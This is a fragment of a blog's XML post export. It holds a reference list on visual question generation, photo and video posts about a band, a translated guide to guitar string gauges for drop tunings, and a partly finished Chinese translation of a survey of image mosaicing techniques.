<li><p>[67] <strong>Mostafazadeh, N.</strong>, Brockett, C., Dolan, B., Galley, M., Gao, J., Spithourakis, G. P., &amp; Vanderwende, L. (2017). <strong>Image-grounded conversations: Multimodal context for natural question and response generation.</strong> IJCNLP (pp. 462–472). [<a href="https://arxiv.org/abs/1701.08251">Paper</a>].</p>
</li>
<li><p>[62] <strong>Duan, N.</strong>, Tang, D., Chen, P., &amp; Zhou, M. (2017, September). Question generation for question answering. In Proceedings of the 2017 Conference on Empirical Methods in Natural Language Processing (pp. 866-874).</p>
</li>
<li><p>[24] Zhang, S., Qu, L., You, S., Yang, Z., &amp; Zhang, J. (2016). <strong>Automatic Generation of Grounded Visual Questions.</strong> [<a href="https://arxiv.org/abs/1612.06530">Paper</a>]</p>
</li>
<li><p>[131] Mostafazadeh, N., Misra, I., Devlin, J., Mitchell, M., He, X., &amp; Vanderwende, L. (2016). <strong>Generating natural questions about an image.</strong> In ACL, the Association for Computational Linguistics (pp. 1802-1813).[<a href="https://arxiv.org/abs/1603.06059">Paper</a>] [<a href="https://github.com/gitlost-murali/Natural-Questions-Generation-from-Images">code1</a>] [<a href="https://github.com/chennaveh/VQG">code2</a>] [<a href="https://github.com/chingyaoc/VQG-tensorflow">code3</a>] [<a href="https://github.com/danishnxt/NLP-Project-VisualQuesGen">code4</a>]</p>
</li>
<li><p>Yang, Y., Li, Y., Fermuller, C., &amp; Aloimonos, Y. (2015). <strong>Neural Self Talk: Image Understanding via Continuous Questioning and Answering.</strong>[<a href="https://arxiv.org/abs/1512.03460">Paper</a>].</p>
</li>
<li><p>Carl Saldanha, Visual Question Generation</p>
</li>
<li><p>[3410] Vinyals, O., Toshev, A., Bengio, S., &amp; Erhan, D. (2015). <strong>Show and tell: A neural image caption generator.</strong> In Proceedings of the IEEE conference on computer vision and pattern recognition (pp. 3156-3164).[<a href="https://arxiv.org/pdf/1411.4555.pdf">Paper</a>] [<a href="https://github.com/KranthiGV/Pretrained-Show-and-Tell-model">code1</a>] [<a href="https://github.com/nikhilmaram/Show_and_Tell">code2</a>] [<a href="https://github.com/jazzsaxmafia/show_and_tell.tensorflow">code3</a>]</p>
</li>
</ul>
]]></content>
      <categories>
        <category>工作笔记</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>VQG</tag>
      </tags>
  </entry>
  <entry>
    <title>鲸落分手演出</title>
    <url>/post/whale-fall-2018/</url>
    <content><![CDATA[<p><img src="http://qiniu.s1nh.org/whale_fall_2018_4.jpg"></p>
<span id="more"></span>


<video src="http://qiniu.s1nh.org/whale_fall_2018_0.mp4"   width="800" controls="controls">
Your browser does not support the video tag.
</video>

<video src="http://qiniu.s1nh.org/whale_fall_2018_1.mp4"   width="800" controls="controls">
Your browser does not support the video tag.
</video>

<p><img src="http://qiniu.s1nh.org/whale_fall_2018_3.jpg"><br><img src="http://qiniu.s1nh.org/whale_fall_2018_2.jpg"></p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>如何挑选适合的电吉他琴弦规格，及关于drop调弦适用琴弦规格的问题</title>
    <url>/post/what-string-gauges-should-you-be-playing/</url>
    <content><![CDATA[<p><code>本文大多数内容翻译自 Ernie Ball 的官方博客</code></p>
<blockquote>
<p>在知乎看到这样一个问题，因此搬运了一篇文章：<a href="https://blog.ernieball.com/strings/what-string-gauges-should-you-be-playing/">原文链接</a><br>在练习曲目的过程中，有一些一些关于降调调弦及琴弦规格的一些问题疑问。</p>
<p>从一开始的标准调弦，到后来的drop C。自己用的琴有效弦长25.5。极限应该是dropC了，但一些喜欢的曲目需要dropB调弦，所以有这些疑问：</p>
<p>1:有效弦长25.5的琴，能否达到dropB的要求？所选用弦的规格如何挑选？</p>
<p>2:影响调弦的因素还有那些，比如跟琴本身有没有关系，打个比方，存不存在schecter的琴可以降到B而dean的琴不行？</p>
<p>3:我现在自己琴用的10-46，会不会对琴颈有影响？</p>
</blockquote>
<p><img src="http://qiniu.s1nh.org/ernie-ball-strings.png"></p>
<span id="more"></span>
<hr>
<p>Ernie Ball的艺术家和YouTube上的杰出人物Ryan “Fluff” Bruce分享了一份非常有用的指南，帮助你选择哪种琴弦的型号。他考虑了许多不同的因素，包括音阶长度（Fender音阶[25.5英寸]或Gibson音阶[24.75英寸]），调音，演奏风格等等。</p>
<h2 id="0x01-ELECTRIC-GUITAR-STRING-GAUGES"><a href="#0x01-ELECTRIC-GUITAR-STRING-GAUGES" class="headerlink" title="0x01 ELECTRIC GUITAR STRING GAUGES"></a>0x01 ELECTRIC GUITAR STRING GAUGES</h2><p>电吉他弦有不同的粗细规格。除了琴弦材料等其他因素外，琴弦的粗细对演奏性能和声音也有很大影响。</p>
<p><strong>更细（Light）的琴弦</strong></p>
<ul>
<li>更容易弯曲和演奏，因此非常适合手无缚鸡之力的吉他初学者</li>
<li>是复古电吉他的理想选择</li>
<li>投射力均匀，声音明亮</li>
</ul>
<p><strong>更粗（Heavy）的琴弦</strong></p>
<ul>
<li>需要更多的手指压力来弹奏和推弦</li>
<li>更大的输出，更有力的音色</li>
<li>适用于降低调弦，如 Drop D, Drop A 等。</li>
<li>会对吉他颈部施加更大的张力</li>
</ul>
<h2 id="0x02-GUITAR-TUNINGS"><a href="#0x02-GUITAR-TUNINGS" class="headerlink" title="0x02 GUITAR TUNINGS"></a>0x02 GUITAR TUNINGS</h2><p><strong>标准调弦（E Standard）</strong></p>
<ul>
<li><code>10-46</code> 适用与<strong>所有</strong> scale 的标准琴弦，通常是原厂的配置；</li>
<li><code>09-42</code> 更适合在 <strong>Fender</strong> Scale 乐器上获得更宽松、类似 Les Paul 的感觉；</li>
<li><code>10-52</code> 更适合在 <strong>Gibson</strong> Scale 乐器上获得更重、更像 Strat 的张力；</li>
<li><code>08-46</code> Yngwie 喜欢的配置，极细的1、2弦可以作出特别夸张的推弦效果；</li>
<li><code>09-46</code> <strong>Fender</strong> Scale 乐器上我比较喜欢的配置，较细的1-3弦和较粗的4-6弦，且没有Yngwie那么夸张。</li>
</ul>
<p><strong>Drop D (DADGBE)</strong></p>
<ul>
<li><code>10-52</code> 保持高弦的紧绷感，增强低弦的手感，尤其是在降低的6弦。</li>
</ul>
<p><strong>降半音调弦（Eb Standard）</strong></p>
<ul>
<li><code>10-52</code> <strong>Fender</strong> Scale 乐器上在较低的琴弦上获得更紧的感觉。</li>
<li><code>11-48</code> <strong>Gibson</strong> Scale稍微重一点，同时保留一点松散和紧身（looseness and slinkiness）。</li>
</ul>
<p><strong>金属乐队比较喜欢的 Drop C#</strong></p>
<ul>
<li><code>11-48+52</code> <strong>Fender</strong> Scale 使用 11-48 设置，将低 E 弦换成 52，在粗弦中可以为您提供所需的 low-end chug，同时仍然感觉像是在较高弦上进行标准调音。</li>
<li><code>11-54</code>  <strong>Gibson</strong> Scale 中保持标准调音的感觉。</li>
</ul>
<p><strong>降一个全音的标准调弦（D Standard）</strong></p>
<ul>
<li><code>11-54</code> <strong>Fender</strong> Scale Optimal for detuning. Similar to the Skinny Top / Heavy Bottom, but several gauges heavier. Provides a higher-tension feel.</li>
<li><code>11-48</code> <strong>Gibson</strong> Scale 即使降低了调音，也能保留了正常的琴弦张力。</li>
</ul>
<p><strong>C Standard</strong></p>
<ul>
<li><code>12-56</code> <strong>Fender</strong> Scale (Option A) 仍然感觉很纤细，但保持了良好的张力。</li>
<li><code>11-54</code> <strong>Fender</strong> Scale (Option B) 为了获得更纤细、更宽松的感觉。</li>
<li><code>12-56</code> <strong>Gibson</strong> Scale 有助于在较短的音阶上保持适当的张力。</li>
</ul>
<p><strong>Drop C</strong></p>
<ul>
<li><code>11-54 + 56</code> <strong>Fender</strong> Scale 将 low-E 换成 56 甚至 60 感觉非常好.</li>
<li><code>12-56</code> <strong>Gibson</strong> Scale  在尺寸和张力方面是一个很好的中间地带。在低E弦上添加60号，也可以为低端提供更多的 “动力”。</li>
</ul>
<p><strong>Drop B</strong></p>
<ul>
<li><code>单独购买 11, 15, 20, 36, 48, 60</code> <strong>Fender</strong> Scale 创建一组自定义的单根琴弦可以让您在较高的琴弦上保持张力，同时在较低的琴弦上提供足够的音调。</li>
<li><code>单独购买 12, 16, 24, 36, 48, 60</code> <strong>Gibson</strong> Scale 稍微调整的自定义单弦组可以让您加强较高的琴弦，同时保持较低琴弦的尺寸。也可以在低 E 弦上使用 62 或 64 以增加重量和张力。</li>
</ul>
<h2 id="0x03-BASS-TUNINGS"><a href="#0x03-BASS-TUNINGS" class="headerlink" title="0x03 BASS TUNINGS"></a>0x03 BASS TUNINGS</h2><p><strong>E Standard and Drop D</strong></p>
<ul>
<li><code>50-105</code> ` 良好的张力和音头。不会太紧，也不会太松。</li>
</ul>
<p><strong>Eb Standard and Drop C#</strong></p>
<ul>
<li><code>50-105</code> 从 E 标准和 Drop D 一直到 Eb 标准和 Drop C#。</li>
</ul>
<p><strong>D Standard and Drop C</strong></p>
<ul>
<li><code>55-110</code> 不错的张力，但不是矫枉过正。不会使手疲劳，但有足够的张力来进行重击。</li>
</ul>
<p><strong>Drop B</strong></p>
<ul>
<li><code>60-125+40</code> </li>
</ul>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
      <tags>
        <tag>琴弦</tag>
        <tag>drop 调弦</tag>
      </tags>
  </entry>
  <entry>
    <title>竟然拍了照片</title>
    <url>/post/xb/</url>
    <content><![CDATA[<blockquote>
<p>淘宝的搞活动临时拉我跑龙套，拍了几张照片</p>
</blockquote>
<span id="more"></span>

<p><img src="http://qiniu.s1nh.org/xb-02.jpg"><br><img src="http://qiniu.s1nh.org/xb-03.jpg"><br><img src="http://qiniu.s1nh.org/xb-04.jpg"><br><img src="http://qiniu.s1nh.org/xb-05.jpg"><br><img src="http://qiniu.s1nh.org/xb-06.jpg"><br><img src="http://qiniu.s1nh.org/xb-01.jpg"></p>
]]></content>
      <categories>
        <category>音乐</category>
      </categories>
  </entry>
  <entry>
    <title>图像拼接算法的综述</title>
    <url>/post/A-survey-on-image-mosaicing-techniques/</url>
    <content><![CDATA[<blockquote>
<p>本文作者在2017年提出了L-ORB算法。速度是传统ORB算法的11倍、传统SIFT算法的639倍。将算法应用到嵌入式系统中性能提升了29倍，但其功耗低至10W。有兴趣的可以点击：**<a href="http://crad.ict.ac.cn/CN/Y2017/V54/I6/1316">杜承垚,袁景凌,陈旻骋,李涛. GPU加速与L-ORB特征提取的全景视频实时拼接[J]. 计算机研究与发展, 2017, 54(6): 1316-1325.</a>**</p>
</blockquote>
<hr>
<blockquote>
<p>本文翻译自：<a href="http://www.academia.edu/download/46115290/JVCI_1_Debabrata.pdf">Ghosh, Debabrata, and Naima Kaabouch. “A survey on image mosaicing techniques.” Journal of Visual Communication and Image Representation 34 (2016): 1-11.</a>. 如有错误请指正。</p>
</blockquote>
<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>图像拼接在运动检测和跟踪、增强现实、分辨率增强、视频压缩和图像稳定等机器视觉领域有很大的应用。</p>
<p><img src="http://qiniu.s1nh.org/Blog_Image_keypoint_8.png"> </p>
<p>如图所示，图像拼接分为四个步骤：图像匹配（registration）、重投影（reprojection）、缝合（stitching）和融合（blending）。</p>
<span id="more"></span>

<p><img src="http://qiniu.s1nh.org/Blog_1-s2.0-S1047320315002059-gr1.jpg-QNthin" alt="图1 图像拼接的步骤" title="图1 图像拼接的步骤"></p>
<ul>
<li>图像匹配：是指一对描绘相同场景之间的几张图片的几何对应关系。一组照片可以是不同时间不同位置的拍摄，或者由多个传感器同时拍摄多张图像。</li>
<li>重投影：通过图像的几何变换，把一系列图片转换成一个共同的坐标系</li>
<li>缝合：通过合并重叠部分的像素值并保持没有重叠的像素值使之生成更大画布的图像</li>
<li>融合：通过几何和光度偏移错误通常导致对象的不连续，并在两个图像之间的边界附近产生可见的接缝。因此，为了减小接缝的出现，需要在缝合时或缝合之后使用混合算法.</li>
</ul>
<p>不同的技术已被用于不同的拼接算法来处理多个颜色波段。例如，在<sup><a href="#18">18</a></sup> ，<sup><a href="#19">19</a></sup> ，<sup><a href="#20">20</a></sup>  和  <sup><a href="#21">21</a></sup>中，综合所输入的RGB图像的颜色波段，获得的变换参数。在<sup><a href="#22">22</a></sup> ，<sup><a href="#23">23</a></sup>  和  <sup><a href="#24">24</a></sup>中，该RGB图像首先被转换成灰度，然后得到变换参数。在这两种情况下，找到最佳变换参数后，对所有的颜色波段进行处理，实施重投影（reprojection）步骤。</p>
<h2 id="二、图像拼接算法分类"><a href="#二、图像拼接算法分类" class="headerlink" title="二、图像拼接算法分类"></a>二、图像拼接算法分类</h2><p>“图像匹配”和“融合”是直接影响图像拼接性能两个显著的研究领域。作为图像拼接的第一个和最后一个步骤，如果没有正确的图像匹配和融合算法，几乎不可能进行成功的图像拼接。在本文中，我们对现存的图像拼接算法中“图像匹配”和“融合”的方法进行分类。</p>
<p>如图二所示，对“图像匹配方法”分类，图像拼接算法可分为基于“空间域”和“频域”。基于空间域的图像拼接可以进一步划分为基于区域的图像拼接和基于特征的图像拼接。基于特征的图像拼接可以再细分为基于底层特征的图像拼接（low level feature-based image mosaicing）和基于轮廓的图像拼接（contour-based image mosaicing）。基于底层特征的拼接可以分为四类：基于Harris角点检测器的拼接、基于FAST角点检测器的拼接、基于SIFT特征检测器的拼接、以及基于SURF特征检测器的拼接。<br>如图三所示，根据“融合方法”，拼接算法可分为基于平滑过渡（transition smoothening-based）和基于最佳接缝（optimal seam-based）。基于平滑过渡拼接可以进一步被分成基于羽化（feathering-based）、基于金字塔（pyramid-based）、和基于梯度（gradient-based）的拼接。</p>
<p><img src="http://qiniu.s1nh.org/Blog_1-s2.0-S1047320315002059-gr2.jpg-QNthin" alt="图2" title="图2 根据图像匹配方法的分类"></p>
<p><img src="http://qiniu.s1nh.org/Blog_1-s2.0-S1047320315002059-gr3.jpg-QNthin" alt="图3 根据融合方法的分类" title="图3 根据融合方法的分类"></p>
<h2 id="三、对图像拼接的“图像匹配方法-registration-”分类"><a href="#三、对图像拼接的“图像匹配方法-registration-”分类" class="headerlink" title="三、对图像拼接的“图像匹配方法(registration)”分类"></a>三、对图像拼接的“图像匹配方法(registration)”分类</h2><p>图像匹配不仅是图像拼接的重要一步，也是它的基础。对于相同的目标，但来自不同的传感器、不同的角度和不同的时间产生的多源图像进行匹配，通过观察各对图像之间的对应关系来计算最佳几何变换。这一过程通过预估的几何变换把多源图像排列在一个共同的参考系中。如果多源图像对应点排列在一起，则图像匹配成功。上述的对应关系可以通过匹配图像之间的模板，或通过匹配从图像中提取的特征，或者通过利用在频域中的相位相关属性来建立。基于所述图像配准不同类别的图像拼接算法将在以下两个小节论述。</p>
<h3 id="3-1-基于空间域-Spatial-domain-图像拼接算法"><a href="#3-1-基于空间域-Spatial-domain-图像拼接算法" class="headerlink" title="3.1 基于空间域(Spatial domain)图像拼接算法"></a>3.1 基于空间域(Spatial domain)图像拼接算法</h3><p>这类算法使用像素的属性进行图像匹配，因此它们是最直接的图像拼接的方法。现有的图像拼接算法大部分都属于这一类。图像拼接算法大部分都属于这一类。“基于空间域图像拼接算法”可以是基于区域（area-based）或基于特征（feature-based）的。“基于区域“的图像拼接算法依赖于计算待拼接的两个图像的“窗口”像素值<sup><a href="#18">18</a></sup> 。基本方法是将图像有关联的“窗口”互相转移，看看有多少像素的匹配。随后，获得图像变换参数来弯曲和拼接图片。基于空间域的拼接算法通常被称为基于像素的拼接，因为它们使用的像素之间的匹配，而不是特征之间的匹配。的最常用的两个基于空间域的图像拼接算法 是基于“归一化互相关”（normalized cross correlation）的拼接和基于“互信息”（mutual information）的拼接。这两种方法都提供了图像相似性的量度，这些指标的较大值来自匹配区域或“窗口”大小。</p>
<h4 id="3-1-1-基于归一化互相关（Normalized-Cross-Correlation-NCC）的拼接"><a href="#3-1-1-基于归一化互相关（Normalized-Cross-Correlation-NCC）的拼接" class="headerlink" title="3.1.1 基于归一化互相关（Normalized Cross Correlation, NCC）的拼接"></a>3.1.1 基于归一化互相关（Normalized Cross Correlation, NCC）的拼接</h4><p>此方法计算在两个图像中的每个位移（shifts）的“窗口”之间的相似性。它被定义为<sup><a href="#20">20</a></sup>：</p>
<p><img src="http://qiniu.s1nh.org/Blog_1-s2.0-S1047320315002059-si1.gif"></p>
<p>且</p>
<p>$\overline{I_1} = {1\over N} \sum_i I_1(x_i)$</p>
<p>$\overline{I_2}=\frac{1}{N}\sum_i I_2(x_i+u)$</p>
<p>$\overline{I_1}$  和 $\overline{I_2}$ 是窗口的平均值图像。$I_1(x,y)$和$I_2(x,y)$分别是两张图片。$N$是“窗口”大小，$x_i=(x_i,y_i)$ 是窗口的像素坐标，$u=(u,v)$ 是通过NCC系数计算出的位移或偏移。NCC系数的范围为[-1,1]。   NCC峰值相对应的位移参数表示两个图像之间的几何变换。此方法的优点是计算简单，但是速度特别慢。此外，此类算法要求源图像之间必须有显著的重叠。</p>
<p>为了解决上述问题，<sup><a href="#27">27</a></sup> ，<sup><a href="#44">44</a></sup> ，<sup><a href="#45">45</a></sup> ，<sup><a href="#46">46</a></sup>几种技术已经被提出。Nasibov等人在图像匹配步骤之前使用的亮度校正矩阵，以便使算法对光照变化不敏感[27]。为了使计算速度更快，Berberidis等人提出的空间互相关来计算源的图像之间的位移的迭代算法<sup><a href="#44">44</a></sup>。Zhao等人提出了通过基于调整根据规模，从源图像中提取兴趣点的方向的相关窗口方法等<sup><a href="#45">45</a></sup> ，以增加计算速度。为了提高算法的非刚性变形的存在下的性能，Vercauteren等人<sup><a href="#46">46</a></sup>提出用黎曼统计（Riemannian statistics）与基于散乱数据拟合（scattered data fitting）的拼接。</p>
<h4 id="3-1-2-基于互信息（Mutual-Information-MI）的图像拼接"><a href="#3-1-2-基于互信息（Mutual-Information-MI）的图像拼接" class="headerlink" title="3.1.2 基于互信息（Mutual Information, MI）的图像拼接"></a>3.1.2 基于互信息（Mutual Information, MI）的图像拼接</h4><p>不同于基于图像强度值其计算相似性的NCC，互信息测量基于两个图像之间共享信息数量的相似性。两个图像$I_1(X,Y)$与$I_2(X,Y)$之间的MI以熵表示：</p>
<p>$MI(I_1,I_2)=E(I_1)+E(I_2)-E(I_1,I_2)$</p>
<p>$E(I_1)$和$E(I_2)$分别是$I_1(x,y)$和$I_2(x,y)$的熵。$E(I_1,I_2)$表示两个图像之间的联合熵。熵是一个随机变量的变异性指标。$I_1(x,y)$的变异性指标为：</p>
<p>$E(I_1)=-\sum_g p_{I_1}(g)log(p_{I_1}(g)) $</p>
<p>g是$I_1(x,y) $可能的灰度值，因此$p_{I_1}(g)$是g的概率分布函数。同理，$I_1(x,y)$和$I_2(x,y)$的联合变异性指标为：</p>
<p>$E(I_1,I_2)=-\sum_{g,h} p_{I_1,I_2}(g,h)log(p_{I_1,I_2}(g,h)) $</p>
<p>h是$I_2(x,y) $可能的灰度值，$P_{I_1,I_2}(g,h) $是g和h的联合概率分布函数。通常情况下，两个图像灰度值的联合直方图来用于衡量两个图像之间的联合概率分布。两个图像之间有更好的对齐，那么这两张图的MI值更大。因此，MI值为最大时，两张图像在变换中为几何对齐的。这种拼接方法的优点是对光线和咬合的变化不敏感。然而，这种于基于NCC的方法有计算速度慢、需要大面积输入图像的重叠等缺点。</p>
<p>为了解决上述的缺点，几个技术<sup><a href="#29">29</a></sup>、<sup><a href="#47">47</a></sup>和<sup><a href="#48">48</a></sup>已被提出。在<sup><a href="#29">29</a></sup>，Luna等人使用随机梯度算法（stochastic gradient optimization along with MI-based similarity measure）来加快算法的速度。Dame等人<sup><a href="#47">47</a></sup>采用 B-spline function for normalized mutual probability density加快运算速度。他们进一步采用牛顿法（Newton’s method）来加快位移参数的估计。对于低重叠图片<sup><a href="#48">48</a></sup>，Césare等人提出了一种模版匹配方法。</p>
<p>不同于基于区域（area-based）的方法，基于特征（feature-based）的拼接技术使用特征之间的匹配，来计算一对图像之间的几何变换。因此，这些方法主要依赖于能够提取显著特征的算法。显着特征是图像域的子集，通常是独立的点、连续曲线或连续区域<sup><a href="#49">49</a></sup>。一般的方法是，从源图像检测几个相应的特征，然后使用可靠的对应关系估计单应性矩阵。利用单应矩阵图像进行扭曲然后缝合在一个共同的参考系。因为特征是出发点，整体算法往往会取决于特征提取算法。基于特征的拼接技术一般优于基于区域的技术，但是需要更高的计算成本。根据提取的特征类型，基于特征的拼接方法可分为底层特征的拼接和基于轮廓拼接。</p>
<h4 id="3-1-3-基于底层特征的（Low-level-feature）拼接"><a href="#3-1-3-基于底层特征的（Low-level-feature）拼接" class="headerlink" title="3.1.3 基于底层特征的（Low-level feature）拼接"></a>3.1.3 基于底层特征的（Low-level feature）拼接</h4><p>这些拼接方法不需要大量重叠区域的图像。</p>
<h5 id="3-1-3-1-基于Harris角点检测器的拼接79"><a href="#3-1-3-1-基于Harris角点检测器的拼接79" class="headerlink" title="3.1.3.1 基于Harris角点检测器的拼接79"></a>3.1.3.1 基于Harris角点检测器的拼接<sup><a href="#79">79</a></sup></h5><p>Harris角点检测器在底层拼接中具有较强的鲁棒性。最初检测图像中的局部窗口。然后通过改变在不同的方向窗口的一个小的量来改变强度。<sup><a href="#41">41</a></sup> ：</p>
<p>$E(u,v)=\sum_i w(x_i,y_i)[I(x_i+u,y_i+v)-I(x_i,y_i)]^2$</p>
<p>$w(x_i,y_i) $ 是 检测窗口$(x_i,y_i) $ 的窗口函数。$I(x_i,y_i) $ 是在$(x_i,y_i)$位置的图像强度值，$I(x_i+u,y_i+v) $ 是到$(u,v)$的位移强度。本地纹理周围像素(local texture around pixel,$(x_i,y_i) $可表示为如下自相关矩阵:</p>
<p>$C=\sum_i w(x_i,y_i)<br>\begin{bmatrix}<br> I^2_{x_i} &amp; I_{x_i}I_{y_i}  \\<br> I_{x_i}I_{y_i} &amp;  I^2_{y_i}  \\<br>\end{bmatrix}$</p>
<p>$I_{x_i}$和$I_{x_i}$是$I(x_i,y_i)$的导数。两个矩阵C对应的极大特征值对应着一个角点。窗口的中心点为一个角点的特征。为了使算法更强壮，可以用“cornerness”的R值来消除边缘点：</p>
<p>$R=Det(C)-\alpha Tr^2(C)$</p>
<p>$Tr(C) $ 是C的跟踪函数，$\alpha$的范围是$0.04 \leq \alpha \leq 0.06$。如果R的局部最大值高于阈值T，那么此点即为角点。两张图片的角点全部检测完成后，可以通过NCC或者SDD（Sum of Squared Difference）方法来确定其对应关系。随后利用算出的几何对应关系把图片统一到全局参考系中，以便进行拼接。采用Harris角点拼接算法计算简单，准确。</p>
<p>Harris 角点检测算法的缺点是会有大量密集的角点产生。然而，可以通过排除附近角点的方式来克服次缺点<sup><a href="#23">23</a></sup>。用Harris角点方法的一个主要问题是，在旋转变化比较大时，往往会在拼接时产生重影。<sup><a href="#30">30</a></sup>中通过在Harris角点匹配时使用“slope clustering”的“luminance center-weighting”算法来解决这个问题。另一个问题是在<sup><a href="#50">50</a></sup>中提到的选择局部检测窗口的不确定性，<sup><a href="#51">51</a></sup>，其中使用的区域分割和匹配，来限制搜索窗口中潜在的同源点。</p>
<h5 id="3-1-3-2-基于FAST角点检测器的拼接"><a href="#3-1-3-2-基于FAST角点检测器的拼接" class="headerlink" title="3.1.3.2 基于FAST角点检测器的拼接"></a>3.1.3.2 基于FAST角点检测器的拼接</h5><p>FAST算法是一个在计算上更有效率且比大多数其他低级别特征提取方法快的角点检测算法，因此基于该算法的拼接方法特别适用于实时图像处理应用程序。算法首先围绕一个候选角点选择16个像素点。如果其中有n（n一般为12）个连续的像素都比候选角点加上一个阈值要高，或者比候选角点减去一个阈值要低，那么此点即为角点（如图4所示）。为了加快FAST算法的速度，通常会使用角点响应函数（a corner response function, CRF) 。CRF给出了基于在本地附近的图像强度的角点的“cornerness”的数值<sup><a href="#41">41</a></sup>通过计算出的CRF值检测局部最大值来确定角点。检测后，对每一对帧进行角点匹配。有时，“词袋”（Bag-of-Words, BoW）算法是用来表示每个图像作为一组角点的描述，以加快匹配过程<sup><a href="#31">31</a></sup>。然后，计算出单应矩阵（homography matrices），最后，把图像投射到一个共同的坐标得到最终的拼接图像。</p>
<p><img src="http://qiniu.s1nh.org/Blog_1-s2.0-S1047320315002059-gr4.jpg-QNthin" alt="图4 FAST算法的候选特征检测" title="图4 FAST算法的候选特征检测"></p>
<p>选择最佳的阈值是在FAST的角点检测的算法的一个难点。但是，可以通过结合一个健壮的阈值选择算法<sup><a href="#52">52</a></sup>来处理。为了从连续帧中匹配的角点，他们进一步提出了一个基于区域的灰度关联法的阈值学习方法。基于快速的算法的另一个主要问题是，对于增加变化的程度，算法不是特别健壮。为了解决这个问题，一个很好的方法是对16个像素点进行扩展采样区域，因为它提供给FAST角点更多的标志特征，进而使他们具有更大的不变性。</p>
<h5 id="3-1-3-2-基于SIFT特征检测器的拼接"><a href="#3-1-3-2-基于SIFT特征检测器的拼接" class="headerlink" title="3.1.3.2 基于SIFT特征检测器的拼接"></a>3.1.3.2 基于SIFT特征检测器的拼接</h5><p>SIFT算法是一个检测关键点（distinctive features, also called “keypoints”）的底层特征检测算法。</p>
<p><img src="http://qiniu.s1nh.org/Blog_1-s2.0-S1047320315002059-gr5.jpg-QNthin" alt="图5 " title="图5 "></p>
<h5 id="3-1-3-2-基于SURF特征检测器的拼接"><a href="#3-1-3-2-基于SURF特征检测器的拼接" class="headerlink" title="3.1.3.2 基于SURF特征检测器的拼接"></a>3.1.3.2 基于SURF特征检测器的拼接</h5><p><img src="http://qiniu.s1nh.org/Blog_1-s2.0-S1047320315002059-gr6.jpg-QNthin" alt="图6 " title="图6 "></p>
<h4 id="3-1-4-基于轮廓的拼接"><a href="#3-1-4-基于轮廓的拼接" class="headerlink" title="3.1.4 基于轮廓的拼接"></a>3.1.4 基于轮廓的拼接</h4><h3 id="3-2-基于频域（Frequency）图像拼接算法"><a href="#3-2-基于频域（Frequency）图像拼接算法" class="headerlink" title="3.2 基于频域（Frequency）图像拼接算法"></a>3.2 基于频域（Frequency）图像拼接算法</h3><p><img src="http://qiniu.s1nh.org/Blog_1-s2.0-S1047320315002059-gr7.jpg-QNthin" alt="图7 " title="图7 "></p>
<h2 id="四、对图像拼接的“融合方法（blending）”分类"><a href="#四、对图像拼接的“融合方法（blending）”分类" class="headerlink" title="四、对图像拼接的“融合方法（blending）”分类"></a>四、对图像拼接的“融合方法（blending）”分类</h2><h3 id="4-1-基于平滑过渡（transition-smoothing）融合的图像拼接算法"><a href="#4-1-基于平滑过渡（transition-smoothing）融合的图像拼接算法" class="headerlink" title="4.1 基于平滑过渡（transition smoothing）融合的图像拼接算法"></a>4.1 基于平滑过渡（transition smoothing）融合的图像拼接算法</h3><h4 id="4-1-1-基于羽化（feathering）融合的图像拼接算法"><a href="#4-1-1-基于羽化（feathering）融合的图像拼接算法" class="headerlink" title="4.1.1 基于羽化（feathering）融合的图像拼接算法"></a>4.1.1 基于羽化（feathering）融合的图像拼接算法</h4><p><img src="http://qiniu.s1nh.org/Blog_1-s2.0-S1047320315002059-gr8.jpg-QNthin" alt="图8 " title="图8 "></p>
<h4 id="4-1-2-基于金字塔（pyramid）融合的图像拼接算法"><a href="#4-1-2-基于金字塔（pyramid）融合的图像拼接算法" class="headerlink" title="4.1.2 基于金字塔（pyramid）融合的图像拼接算法"></a>4.1.2 基于金字塔（pyramid）融合的图像拼接算法</h4><p><img src="http://qiniu.s1nh.org/Blog_1-s2.0-S1047320315002059-gr9.jpg-QNthin" alt="图9 " title="图9 "></p>
<h4 id="4-1-3-基于梯度（gradient）融合的图像拼接算法"><a href="#4-1-3-基于梯度（gradient）融合的图像拼接算法" class="headerlink" title="4.1.3 基于梯度（gradient）融合的图像拼接算法"></a>4.1.3 基于梯度（gradient）融合的图像拼接算法</h4><h3 id="4-2-基于最佳接缝（optimal-seam）混合的图像拼接算法"><a href="#4-2-基于最佳接缝（optimal-seam）混合的图像拼接算法" class="headerlink" title="4.2 基于最佳接缝（optimal seam）混合的图像拼接算法"></a>4.2 基于最佳接缝（optimal seam）混合的图像拼接算法</h3><p>This type of mosaicing algorithms attempt to minimize the visibility of seams by looking for optimal seams in the joining boundaries between the images. The objective of optimal seam technique is to allocate the optimal location of a seam line by looking into the overlapping region between a pair of images. The seam line placement should be such that it minimizes the photometric differences between the two sides of the line. At the same time the seam line should be able to determine the contribution of each of the images in the final mosaic. Once the placement and the contribution information are obtained, each image is copied to the corresponding side of the seam. When the difference between the two images on the seam line is zero, no seam gradients are produced in the mosaic. Unlike the mosaicing methods using transition smoothing-based blending, optimal seam-based mosaicing algorithms consider the information content of the scene in the overlapping region, allowing to deal with problems like moving objects or parallax. However, no information is fused in the overlapping region, thus the transition between the images can be easily noticeable when there are global intensity or exposure difference between the frames.</p>
<p>Different optimal seam finding methods have been used in mosaicing literature. For example, in [36] a modified region-of-difference method is used. In [77], authors proposed the use of an algorithm based on watershed segmentation and graph cut optimization. Another method based on dynamic programming and grey relational analysis is used in [78].</p>
<p>A general comparison of different categories of mosaicing algorithms based on image blending is presented in Table 3. Table 4 highlights the processing times of different mosaicing papers surveyed based on image blending.</p>
<p>Table 3.<br>Comparative overview of different categories of mosaicing methods based on image blending.</p>
<p>Category     | Advantages| Disadvantages|<br>Feathering-based |    Fast and good performer under exposure differences | Output often suffer from blur and ghosting effect<br>Pyramid-based |    Good in preventing blur and edge duplication | Suffers from double contouring and ghosting when registration error significant<br>Gradient-based    Output visually more appealing than other methods    High computation required and registration error must be small for good performance<br>Optimal seam-based    Good in dealing with moving objects and parallax    Transition obvious when there are exposure differences</p>
